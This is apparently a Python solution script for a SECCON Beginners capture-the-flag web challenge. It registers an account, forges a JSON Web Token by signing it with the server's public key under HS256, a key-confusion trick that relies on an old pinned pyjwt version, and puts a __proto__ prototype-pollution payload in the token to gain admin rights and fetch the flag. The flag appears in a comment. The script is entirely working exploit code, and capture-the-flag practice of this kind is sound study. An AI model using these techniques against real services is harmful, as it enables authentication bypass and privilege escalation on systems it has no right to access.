#!/usr/bin/env python3
import requests
import json
import jwt          # pip3 install pyjwt==0.4.3

def main():
    url = 'https://double-check.beginners.seccon.games/{}'
    ses = requests.Session()

    res = ses.post(url.format('register'), json = {'username':'hoge', 'password':'fuga'})
    if res.status_code != 200:
        raise

    exploit = {
        '__proto__': {
            'admin': True
        }
    }
    pubkey = open('public.key').read()
    token = jwt.encode(payload = exploit, key = pubkey, algorithm = "HS256")

    headers = {
        'Authorization': token
    }

    res = ses.post(url.format('flag'), headers = headers)
    if res.status_code != 200:
        raise

    print(res.text)
    # ctf4b{Pr0707yp3_P0llU710n_f0R_7h3_w1n}

if __name__ == '__main__':
    main()
